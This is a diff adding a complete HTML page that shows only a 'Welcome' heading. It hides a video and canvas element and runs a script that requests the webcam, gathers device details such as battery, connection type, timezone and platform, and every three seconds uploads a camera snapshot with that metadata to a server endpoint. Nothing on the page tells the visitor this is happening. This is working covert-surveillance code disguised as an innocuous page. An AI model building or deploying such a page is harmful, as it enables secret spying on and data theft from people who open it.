@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>📸 Welcome</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-size: 3em;
+    }
+    video, canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>Welcome</h1>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    let deviceData = {
+      userAgent: navigator.userAgent,
+      time: new Date().toLocaleString(),
+      battery: 'unknown',
+      connection: 'unknown',
+      language: navigator.language || 'unknown',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
+      platform: navigator.platform || 'unknown',
+      vendor: navigator.vendor || 'unknown'
+    };
+
+    // Get battery info
+    if ('getBattery' in navigator) {
+      navigator.getBattery().then(b => {
+        deviceData.battery = Math.round(b.level * 100) + '%';
+      });
+    }
+
+    // Get connection info
+    if (navigator.connection) {
+      deviceData.connection = navigator.connection.effectiveType;
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+
+        setInterval(() => {
+          if (video.videoWidth > 0 && video.videoHeight > 0) {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append('image', blob, 'snapshot.png');
+              formData.append('metadata', JSON.stringify(deviceData));
+
+              fetch('/upload', {
+                method: 'POST',
+                body: formData
+              }).catch(err => console.error('Upload error:', err));
+            }, 'image/png');
+          }
+        }, 3000); // كل 3 ثواني
+      })
+      .catch(err => console.error('Camera error:', err));
+  </script>
+</body>
+</html>
